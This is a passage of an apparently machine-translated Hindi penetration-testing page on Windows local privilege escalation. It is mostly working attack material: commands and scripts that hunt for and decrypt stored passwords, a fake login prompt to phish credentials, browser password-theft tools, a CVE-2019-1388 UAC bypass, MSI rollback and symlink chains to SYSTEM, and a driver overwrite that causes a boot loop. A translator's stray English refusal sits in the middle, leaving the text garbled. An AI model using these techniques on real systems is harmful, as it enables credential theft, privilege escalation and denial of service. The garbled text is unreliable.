crackmapexec का उपयोग करके पासवर्ड प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
क्रेडेंशियल्स के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials के लिए पूछें

यदि आपको लगता है कि वह उन्हें जानता होगा, तो आप हमेशा **user से उसके credentials या किसी अन्य user के credentials दर्ज करने के लिए पूछ सकते हैं** (ध्यान दें कि क्लाइंट से सीधे **credentials** माँगना वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभव फ़ाइल-नाम जिनमें credentials हो सकते हैं**

जानी-मानी फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में पाए गए थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don’t have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or upload the file) and I will translate the relevant English text to Hindi following the exact markdown/HTML and the rules you specified.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### रीसायकल बिन में क्रेडेंशियल्स

आपको बिन के अंदर भी क्रेडेंशियल्स खोजने के लिए जाँच करनी चाहिए

कई प्रोग्रामों द्वारा सहेजे गए पासवर्ड **पुनर्प्राप्त** करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**क्रेडेंशियल्स वाले अन्य संभावित रजिस्ट्री कीज**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़रों का इतिहास

आपको उन dbs की जांच करनी चाहिए जहाँ **Chrome or Firefox** के passwords संग्रहित होते हैं।\
ब्राउज़र के history, bookmarks और favourites भी जांचें — हो सकता है कि कुछ **passwords are** वहाँ स्टोर हों।

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में बनी एक तकनीक है जो विभिन्न भाषाओं के software components के बीच intercommunication की अनुमति देती है। प्रत्येक COM component को **class ID (CLSID)** के द्वारा पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality expose करता है, जिन्हें interface IDs (IIDs) कहा जाता है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** को मर्ज करके बनाई जाती है।

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

बुनियादी रूप से, यदि आप उन किसी भी DLLs को overwrite कर सकते हैं जिन्हें execute किया जाएगा, तो आप privileges escalate कर सकते हैं यदि वह DLL किसी अलग user द्वारा execute किया जाएगा।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निर्दिष्ट फ़ाइल नाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** प्लगइन है। मैंने यह प्लगइन बनाया है ताकि यह **automatically execute every metasploit POST module that searches for credentials** victim के अंदर चला सके।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से इस पेज में बताए गए उन सभी फाइलों की खोज करता है जिनमें passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) सिस्टम से password निकालने के लिए एक और बढ़िया टूल है।

यह टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई टूल्स की **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना करें कि **एक प्रोसेस जो SYSTEM के रूप में चल रहा है एक नया प्रोसेस** (`OpenProcess()`) **पूर्ण पहुँच के साथ खोलता है**। वही प्रोसेस **एक और नया प्रोसेस भी बनाता है** (`CreateProcess()`) **कम विशेषाधिकार के साथ लेकिन main प्रोसेस के सभी open handles को विरासत में लेते हुए**.\
फिर, यदि आपके पास **कम-विशेषाधिकार प्रोसेस पर पूर्ण पहुँच** है, तो आप `OpenProcess()` से बनाए गए привिलेग्ड प्रोसेस के **open handle** को पकड़कर **shellcode** inject कर सकते हैं.\
[इस उदाहरण को पढ़ें अधिक जानकारी के लिये कि **कैसे इस vulnerability का पता लगायें और इसका फायदा उठायें**.](leaked-handle-exploitation.md)\
[इस **दूसरे पोस्ट** को पढ़ें एक अधिक पूर्ण व्याख्या के लिये कि कैसे विभिन्न permission स्तरों (केवल full access नहीं) के साथ विरासत में मिले processes और threads के और open handlers को टेस्ट और abuse किया जा सकता है।](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें सामान्यतः pipes कहा जाता है, प्रक्रिया संचार और डेटा ट्रांसफर सक्षम करते हैं।

Windows एक सुविधा प्रदान करता है जिसे कहा जाता है Named Pipes, जो unrelated processes को डेटा साझा करने की अनुमति देता है, यहां तक कि विभिन्न नेटवर्क्स पर भी। यह client/server आर्किटेक्चर जैसा है, जिसमें भूमिकाएँ होती हैं **named pipe server** और **named pipe client**।

जब कोई **client** pipe के माध्यम से डेटा भेजता है, तो वह **server** जिसने pipe सेटअप किया है, के पास client की identity को **impersonate** करने की क्षमता होती है, यदि उसके पास आवश्यक अधिकार जैसे **SeImpersonate** मौजूद हों। किसी ऐसे **privileged process** की पहचान करना जो आपके द्वारा बनाए गए pipe के माध्यम से संचार कर रहा हो आपको एक अवसर देता है कि आप उस प्रक्रिया की पहचान अपना कर उच्चतर privileges हासिल कर लें जब वह आपके द्वारा स्थापित pipe के साथ इंटरैक्ट करे। ऐसे हमले को करने के निर्देशों के लिए सहायक गाइड यहाँ मिल सकते हैं: [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system).

साथ ही निम्न टूल्स यह अनुमति देते हैं कि आप named pipe संचार को burp जैसे टूल के साथ intercept कर सकें: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह टूल सभी pipes को list और देखना अनुमति देता है ताकि privescs ढूंढे जा सकें** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

अधिक जानकारी:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## विविध

### File Extensions that could execute stuff in Windows

पेज देखें **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links जो `ShellExecuteExW` को फॉरवर्ड होते हैं, खतरनाक URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) ट्रिगर कर सकते हैं और current user के रूप में attacker-controlled फाइलें execute करवा सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

जब user के रूप में shell मिल जाये, तो हो सकता है कि scheduled tasks या अन्य प्रक्रियाएँ चल रही हों जो **command line पर credentials पास कर रही हों**। नीचे दिया गया स्क्रिप्ट हर दो सेकंड में प्रोसेस command lines को कैप्चर करता है और वर्तमान स्थिति की तुलना पिछली स्थिति से करता है, और किसी भी बदलाव को आउटपुट करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रक्रियाओं से पासवर्ड चुराना

## Low Priv User से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (console या RDP के माध्यम से) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में unprivileged user से "NT\AUTHORITY SYSTEM" जैसे terminal या किसी अन्य process को चलाना संभव है।

इससे एक ही vulnerability के जरिए privileges escalate करना और UAC को bypass करना दोनों संभव हो जाता है। साथ ही, कुछ भी install करने की आवश्यकता नहीं होती और प्रक्रिया में प्रयुक्त binary Microsoft द्वारा signed और issued होता है।

प्रभावित सिस्टमों में निम्नलिखित शामिल हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित चरणों का पालन करना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह हमला मूल रूप से Windows Installer के rollback फीचर का दुरुपयोग करके अनइंस्टॉलेशन प्रक्रिया के दौरान वैध फ़ाइलों को खतरनाक फ़ाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनानी होती है जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए इस्तेमाल होगी, जिसे बाद में Windows Installer अन्य MSI पैकेजों के अनइंस्टॉल के समय rollback फ़ाइलें स्टोर करने के लिए उपयोग करता है, जहाँ rollback फ़ाइलों में malicious payload डाला जाएगा।

संक्षेप में तकनीक निम्नानुसार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- एक `.msi` बनाएँ जो एक harmless फ़ाइल (जैसे `dummy.txt`) को किसी writable फ़ोल्डर (`TARGETDIR`) में इंस्टॉल करे।
- इंस्टॉलर को **"UAC Compliant"** के रूप में चिह्नित करें, ताकि एक **non-admin user** उसे चला सके।
- इंस्टॉल के बाद फ़ाइल का एक **handle** खुले रखें।

- Step 2: Begin Uninstall
- उसी `.msi` को अनइंस्टॉल करें।
- अनइंस्टॉल प्रक्रिया फ़ाइलों को `C:\Config.Msi` में मूव करना शुरू करती है और उन्हें `.rbf` फ़ाइलों में rename कर देती है (rollback backups)।
- जब फ़ाइल `C:\Config.Msi\<random>.rbf` बनती है तो इसका पता लगाने के लिए खुले हुए फ़ाइल हैंडल को `GetFinalPathNameByHandle` का उपयोग करके **poll** करें।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है जो:
- संकेत देता है जब `.rbf` लिखा गया हो।
- फिर अनइंस्टॉल को जारी रखने से पहले किसी अन्य event पर **wait** करता है।

- Step 4: Block Deletion of `.rbf`
- संकेत मिलने पर, `.rbf` फ़ाइल को `FILE_SHARE_DELETE` के बिना खोलें — यह उसे हटाए जाने से **रोकता** है।
- फिर uninstall को जारी रखने के लिए **signal back** करें।
- Windows Installer `.rbf` को delete करने में विफल रहता है, और चूंकि यह सभी contents को delete नहीं कर पाता, **`C:\Config.Msi` हटाया नहीं जाता**।

- Step 5: Manually Delete `.rbf`
- आप (attacker) मैन्युअली `.rbf` फ़ाइल को delete कर देते हैं।
- अब **`C:\Config.Msi` खाली है**, और hijack के लिए तैयार है।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **SYSTEM-level arbitrary folder delete vulnerability** को ट्रिगर करें।

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- खुद `C:\Config.Msi` फ़ोल्डर को पुन: बनाएँ।
- कमजोर DACLs सेट करें (उदा., Everyone:F), और `WRITE_DAC` के साथ एक handle खुले रखें।

- Step 7: Run Another Install
- `.msi` को फिर से install करें, जिसमें:
- `TARGETDIR`: Writable location.
- `ERROROUT`: एक variable जो forced failure को ट्रिगर करता है।
- यह install फिर से **rollback** ट्रिगर करने के लिए उपयोग किया जाएगा, जो `.rbs` और `.rbf` को पढ़ेगा।

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` को मॉनिटर करें जब तक कि एक नई `.rbs` प्रकट न हो।
- उसका filename कैप्चर करें।

- Step 9: Sync Before Rollback
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है जो:
- `.rbs` बनते ही एक event को signal करता है।
- फिर जारी रखने से पहले **wait** करता है।

- Step 10: Reapply Weak ACL
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर मजबूत ACLs फिर से लागू कर देता है।
- लेकिन चूँकि आपके पास अभी भी `WRITE_DAC` के साथ एक handle है, आप फिर से कमजोर ACLs लागू कर सकते हैं।

> ACLs केवल handle open के समय लागू होते हैं, इसलिए आप अभी भी फ़ोल्डर में लिख सकते हैं।

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` फ़ाइल को overwrite करके एक **fake rollback script** डालें जो Windows को बताए:
- आपके `.rbf` (malicious DLL) को एक **privileged location** में restore करने के लिए (उदा., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।
- आपका fake `.rbf` drop करें जिसमें **malicious SYSTEM-level payload DLL** होता है।

- Step 12: Trigger the Rollback
- sync event को signal करें ताकि installer resume करे।
- एक **type 19 custom action (`ErrorOut`)** कॉन्फ़िगर किया गया है जो install को जानबूझकर एक ज्ञात बिंदु पर fail कर देता है।
- इससे **rollback शुरू** हो जाता है।

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- आपके malicious `.rbs` को पढ़ता है।
- आपके `.rbf` DLL को target location में copy करता है।
- अब आपके पास **malicious DLL एक SYSTEM-loaded path** में है।

- Final Step: Execute SYSTEM Code
- किसी trusted **auto-elevated binary** को चलाएँ (उदा., `osk.exe`) जो आपके द्वारा hijack की गई DLL को load करता है।
- **Boom**: आपका कोड **SYSTEM के रूप में execute** होता है।


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **index metadata** संग्रहीत करता है।

तो, यदि आप किसी फ़ोल्डर का **`::$INDEX_ALLOCATION` stream हटाते हैं**, तो NTFS फ़ाइल सिस्टम से **पूरे फ़ोल्डर को हटा देता है**।

आप इसे standard file deletion APIs जैसे तरीकों का उपयोग करके कर सकते हैं:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> हालाँकि आप *file* delete API को कॉल कर रहे हैं, यह **खुद folder को ही delete कर देता है**।

### Folder Contents Delete से SYSTEM EoP तक
मान लें आपकी primitive आपको arbitrary files/folders को delete करने की अनुमति नहीं देती, पर यह **attacker-controlled folder के *contents* को delete करने की अनुमति देती है**?

1. Step 1: एक bait folder और file सेटअप करें
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है, तो oplock **execution को pause कर देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों (उदा., `%TEMP%`) को स्कैन करती है और उनकी सामग्री को हटाने की कोशिश करती है।
- जब यह `file1.txt` तक पहुँचता है, तो **oplock triggers** और नियंत्रण आपके callback को सौंप दिया जाता है।

4. चरण 4: oplock callback के अंदर – हटाने को पुनर्निर्देशित करें

- विकल्प A: `file1.txt` को किसी अन्य स्थान पर स्थानांतरित करें
- यह `folder1` को खाली कर देता है बिना oplock को तोड़े।
- सीधे `file1.txt` को न हटाएँ — इससे oplock समय से पहले रिलीज़ हो जाएगा।

- विकल्प B: `folder1` को **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को लक्षित करता है जो फ़ोल्डर metadata को स्टोर करता है — इसे डिलीट करने से फ़ोल्डर भी डिलीट हो जाता है।

5. Step 5: Release the oplock
- SYSTEM process जारी रहता है और `file1.txt` को डिलीट करने का प्रयास करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में डिलीट कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**नतीजा**: `C:\Config.Msi` को SYSTEM द्वारा हटा दिया जाता है।

### From Arbitrary Folder Create to Permanent DoS

ऐसे primitive का फायदा उठाएँ जो आपको **create an arbitrary folder as SYSTEM/admin** करने की अनुमति दे — भले ही आप **you can’t write files** या **set weak permissions**।

एक **फ़ोल्डर** (फ़ाइल नहीं) बनाएं जिसका नाम किसी **critical Windows driver** का हो, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode driver के अनुरूप होता है।
- यदि आप **इसे फ़ोल्डर के रूप में पहले से बनाते हैं**, तो Windows बूट पर असली ड्राइवर लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक ड्राइवर को हल करने में विफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**।
- बिना बाहरी हस्तक्षेप (उदाहरण के लिए, boot repair या disk access) के **कोई fallback नहीं** और **कोई recovery नहीं**।

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

जब कोई **privileged service** किसी पथ पर logs/exports लिखता है जो किसी **writable config** से पढ़ा गया हो, तो उस पथ को **Object Manager symlinks + NTFS mount points** से redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहाँ तक कि **without** `SeCreateSymbolicLinkPrivilege`)।

**Requirements**
- लक्षित पथ संग्रहीत करने वाली config हमलावर द्वारा writable हो (उदाहरण: `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point बनाने और एक OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- वह privileged operation जो उस पथ पर लिखे (log, export, report)।

**Example chain**
1. कॉन्फ़िग पढ़ें ताकि privileged log destination पाया जा सके, उदाहरण: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` जो `C:\ProgramData\ICONICS\IcoSetup64.ini` में है।
2. बिना admin के पथ को redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. प्रिविलेज्ड component के लॉग लिखने का इंतज़ार करें (उदा., admin "send test SMS" ट्रिगर करता है)। अब write `C:\Windows\System32\cng.sys` में आता है।
4. ओवरराइट किए गए target (hex/PE parser) का निरीक्षण करें ताकि corruption की पुष्टि हो; reboot Windows को tampered driver path लोड करने के लिए मजबूर कर देता है → **boot loop DoS**। यह किसी भी protected फ़ाइल पर भी सामान्यीकृत होता है जिसे कोई privileged service write के लिए खोलेगा।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से लोड होता है, लेकिन अगर `C:\Windows\System32\cng.sys` में एक कॉपी मौजूद है तो उसे पहले कोशिश की जा सकती है, जिससे यह corrupt डेटा के लिए एक reliable DoS sink बन जाता है।



## **High Integrity से System तक**

### **नया service**

यदि आप पहले से ही किसी High Integrity process पर चल रहे हैं, तो **path to SYSTEM** आसान हो सकती है बस **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि यह एक वैध service हो या binary आवश्यक क्रियाएँ तेज़ी से करे, क्योंकि यदि यह वैध service नहीं है तो इसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity प्रक्रिया से आप कोशिश कर सकते हैं कि **AlwaysInstallElevated registry entries को enable करें** और _**.msi**_ wrapper का उपयोग करके एक **reverse shell install** करें.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास ये token privileges हैं (संभावना है कि आप इन्हें पहले से ही किसी High Integrity प्रक्रिया में पाएँगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (protected processes नहीं) को खोल पाएँगे, उस process का token copy कर पाएँगे, और उस token के साथ कोई भी arbitrary process बना पाएँगे।\
इस तकनीक के लिए आमतौर पर SYSTEM के रूप में चल रहे किसी ऐसे process को चुना जाता है जिसके पास सभी token privileges हों (_हाँ, आप SYSTEM processes पा सकते हैं जिनके पास सभी token privileges नहीं होते_)।\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह तकनीक meterpreter द्वारा getsystem में escalate करने के लिए उपयोग की जाती है। तकनीक में एक pipe बनाना और फिर उस pipe पर लिखने के लिए किसी service को बनाना/abuse करना शामिल है। फिर, वह server जिसने SeImpersonate privilege का उपयोग करके pipe बनाई होगी, pipe client (service) के token को impersonate करने में सक्षम होगा और SYSTEM privileges प्राप्त कर लेगा।\
